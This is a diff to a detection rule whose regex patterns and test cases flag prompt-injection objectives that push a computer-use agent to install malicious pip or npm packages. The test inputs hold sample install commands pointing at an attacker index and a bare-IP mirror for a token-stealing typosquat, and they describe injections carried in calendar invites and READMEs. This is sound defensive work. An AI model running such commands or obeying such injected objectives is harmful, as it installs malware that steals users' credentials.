@@ -66,33 +66,20 @@ detection:
     # VPI: attacker_objective for malicious pip/npm install
     - field: content
       operator: regex
-      value: "(?i)\\battacker_objective\\s*=\\s*Get\\s+the\\s+(?:CUA|agent)\\s+to\\s+execute\\s+the\\s+(?:pip|npm)\\s+command\\s+to\\s+install\\s+the\\s+malicious"
-      description: "VPI attacker_objective for malicious pip/npm install"
-    # pip install from URL or with specific flags targeting untrusted source
+      value: '(?i)\battacker_objective\s*=\s*Get\s+the\s+(?:CUA|agent)\s+to\s+execute\s+the\s+(?:pip|npm)\s+command\s+to\s+install\s+the\s+malicious'
+      description: VPI corpus attacker_objective literal — a verbatim corpus artefact, not ordinary prose.
     - field: content
       operator: regex
-      value: "(?i)(?:execute|run|install)\\s+(?:the\\s+)?pip\\s+(?:install|install\\s+-[iI]|install\\s+--index-url)[^\\s]{0,5}\\s+(?:https?://[^\\s]+|--extra-index-url\\s+https?://[^\\s]+)[^.\\n]{0,100}(?:malicious|attacker|evil|fake|hostile)"
-      description: "pip install from non-standard/attacker-controlled index"
-    # npm install of package from suspicious registry
+      value: '(?i)(?:execute|run)\s+(?:the\s+)?pip\s+(?:install\s+)?command\s+to\s+install\s+the\s+malicious[\s\S]{0,160}(?:https?://|\d{1,3}(?:\.\d{1,3}){3}|--?index-url|--?extra-index-url|\bfrom\s+the\s+(?:provided|attached|following|given|linked)\s+(?:url|link|index|registry|repository|repo|mirror|source)|\.whl\b|\.tgz\b|\bgit\+)'
+      description: Directive to run the pip install command for a malicious package AND a concrete source the agent can act on (URL, bare IPv4, --index-url, "from the provided URL", .whl/.tgz, git+). An incident write-up that says the campaign installed a malicious package "from the actor's mirror" names no actionable source and no longer fires.
     - field: content
       operator: regex
-      value: "(?i)(?:execute|run)\\s+(?:the\\s+)?npm\\s+install\\s+[^\\s]+[^.\\n]{0,100}(?:malicious|attacker|evil|hostile|fake)\\s+(?:python|node|npm|package)"
-      description: "npm install of package described as malicious"
-    # General: install + malicious python/node package
-    - field: content
-      operator: regex
-      value: "(?i)(?:install|execute)\\s+(?:the\\s+)?(?:malicious|hostile|fake)\\s+(?:python|node\\.?js?|npm)\\s+package"
-      description: "Direct reference to installing a malicious package"
-    # pip install command + malicious package from URL
-    - field: content
-      operator: regex
-      value: "(?i)(?:execute|run)\\s+(?:the\\s+)?pip\\s+(?:install\\s+)?command\\s+to\\s+install\\s+the\\s+malicious"
-      description: "Execute the pip install command to install the malicious package"
+      value: '(?i)(?:\b(?:malicious|hostile|evil|backdoored|trojanized|attacker[- ]controlled)\s+(?:python|node(?:\.?js)?|npm|pypi|pip|javascript)?\s*packages?\b[\s\S]{0,200}\b(?:pip3?|npm|npx|pnpm|yarn|uv)\s+(?:install|add)\s+(?:-{1,2}[a-zA-Z][\w.=:/-]*\s+)*(?:https?://\S+|git\+\S+|[a-zA-Z0-9][\w.@/-]*[-.@/][\w.@/-]*|[a-zA-Z0-9][\w-]*(?:==|@)[\w.*-]+)|\b(?:pip3?|npm|npx|pnpm|yarn|uv)\s+(?:install|add)\s+(?:-{1,2}[a-zA-Z][\w.=:/-]*\s+)*(?:https?://\S+|git\+\S+|[a-zA-Z0-9][\w.@/-]*[-.@/][\w.@/-]*|[a-zA-Z0-9][\w-]*(?:==|@)[\w.*-]+)[\s\S]{0,200}\b(?:malicious|hostile|evil|backdoored|trojanized|attacker[- ]controlled)\s+(?:python|node(?:\.?js)?|npm|pypi|pip|javascript)?\s*packages?\b)'
+      description: 'A package described as malicious/hostile/evil co-occurring (either order, within 200 chars) with a concrete package-manager invocation that has a real target (URL, git+, version pin, or a dotted/dashed/scoped package token). Prose that only calls a package malicious — advisories, blog posts, sample-malware READMEs — carries no invocation and no longer fires. "fake" was dropped from the adjective list entirely: it is the standard word for a test double ("install the fake python package that ships in tests/fixtures/").'
   condition: any
   false_positives:
-    - "Security research documents describing package installation attacks as examples"
-    - "Malware analysis reports that reference pip install commands in IOC sections"
-
+    - Malware analysis or red-team write-ups that quote the attacker's own imperative verbatim AND include a concrete index URL and the words "malicious ... package" in the same paragraph. The reporting sentence and the attack sentence are word-for-word identical here; the pattern layer cannot separate them. See docs/DETECTION-BOUNDARY.md — judgment-type residue.
+    - Security education that instructs a reader to install a deliberately malicious package inside a lab container, with the real command shown.
 response:
   actions:
     - block_input
@@ -131,3 +118,30 @@ test_cases:
     - input: "Please install the Python virtual environment and activate it."
       expected: not_triggered
       description: "Legitimate virtual environment setup"
+    - input: The fixture directory tests/fixtures/pkg-typosquat holds a stub wheel with no code in it. To reproduce the scanner test, install the fake python package that ships in tests/fixtures/ and assert that the audit returns exactly one finding.
+      expected: not_triggered
+      description: test fixture — "fake package" is test-double vocabulary and there is no install command
+    - input: 'sample-malware/README.md — every artefact here is an inert copy captured from a public feed. To reproduce finding #12, install the hostile npm package from the sample bundle inside the disposable container only.'
+      expected: not_triggered
+      description: sample-malware README — names a hostile package but issues no package-manager command
+    - input: In this post I show how an indirect prompt injection can make an assistant install the malicious python package an attacker names inside a calendar invite, and how one detection rule catches it before the shell runs.
+      expected: not_triggered
+      description: security blog describing the attack — no executable primitive
+    - input: 'CVE-2026-31337: a crafted README causes the coding assistant to install the fake npm package published by the reporter. Fixed in 3.2.1; no evidence of exploitation in the wild.'
+      expected: not_triggered
+      description: CVE advisory — describes the install, does not perform it
+    - input: Stage 2 of the campaign asks the developer to execute the pip install command to install the malicious package hosted on the actor's mirror. We recovered the wheel and recorded its sha256 in the IOC table.
+      expected: not_triggered
+      description: malware analysis quoting the campaign directive but naming no actionable source
+    - input: 'Finding 4 (High): during the engagement we could run pip install --index-url https://pkgs.redteam.example/simple/ acme-utils to deliver the malicious test payload onto a developer workstation with no prompt.'
+      expected: not_triggered
+      description: red-team report — real command, but "malicious test payload" is not "malicious package"
+    - input: 'IOC section: run pip install --index-url http://185.199.108.153:8000/simple/ colourama was the observed command; the fake python package mimics colorama and steals tokens at import time.'
+      expected: not_triggered
+      description: IOC section — real command, but the package is called "fake", not malicious
+    - input: sample-malware/ — do not run anything in this directory outside the analysis VM. Each subfolder holds one confirmed malicious package together with its manifest and hashes.
+      expected: not_triggered
+      description: sample-malware README — "malicious package" with no package-manager invocation
+    - input: 'GHSA text: the malicious npm package exfiltrates environment variables at install time. Affected versions 1.0.0 through 1.0.3 — remove it and rotate any credentials it could read.'
+      expected: not_triggered
+      description: GHSA advisory — "malicious npm package" with no invocation
